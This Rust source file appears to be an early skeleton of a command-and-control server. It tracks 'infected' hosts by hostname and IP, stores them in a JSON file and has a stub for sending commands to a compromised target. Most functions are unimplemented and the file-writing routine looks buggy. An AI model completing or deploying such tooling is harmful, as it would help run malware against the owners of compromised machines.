use std::{fs, net::Ipv4Addr, path::PathBuf, str::FromStr};

use anyhow::Error;
use serde::{Deserialize, Serialize};
use thiserror::Error;
use dirs::config_dir;

use crate::{domains::infected::{HostName, Infected, InfectedId, InfectedIpAddr}, interface::app::App, repos::database::{InfectedDatabaseError, InfectedRepo}};

pub fn get_infected_all() -> Vec<Infected> {
    todo!()
}

pub fn create_infected(infected: &Infected, database: impl InfectedRepo) -> Result<(), InfectedDatabaseError> {
    database.add_infected(infected)
}

pub fn get_infected(id: InfectedId) -> Infected {
    todo!()
}

#[derive(Error, Debug, Deserialize, Serialize, Clone, Copy)]
#[error("Command could not execute")]
pub struct CommandExecutionError;

pub fn send_command(command: crate::domains::command::Command, target: Infected) -> Result<(), CommandExecutionError> {
    todo!()
}

pub struct InfectedDatabase;

impl InfectedRepo for InfectedDatabase {
    fn add_infected(&self, infected: &Infected) -> Result<(), InfectedDatabaseError> {
        let infected_config_file = "infected.json";

        let mut config_path: PathBuf = match dirs::config_dir() {
            Some(path) => path,
            None => {
                return Err(InfectedDatabaseError::NotFound);
            }
        };

        config_path.push(infected_config_file);

        let _ = fs::create_dir_all(&config_path).map_err(|_e| InfectedDatabaseError::NotFound);

        let data = serde_json::to_string(&infected).unwrap();

        fs::write(config_path, data).unwrap();

        Ok(())
    }

    fn get_all_infected() -> Result<Vec<Infected>, InfectedDatabaseError> {
        todo!()
    }

    fn get_infected() -> Result<Infected, InfectedDatabaseError> {
        todo!()
    }

    fn remove_infected() -> Result<(), InfectedDatabaseError> {
        Ok(())
    }
}

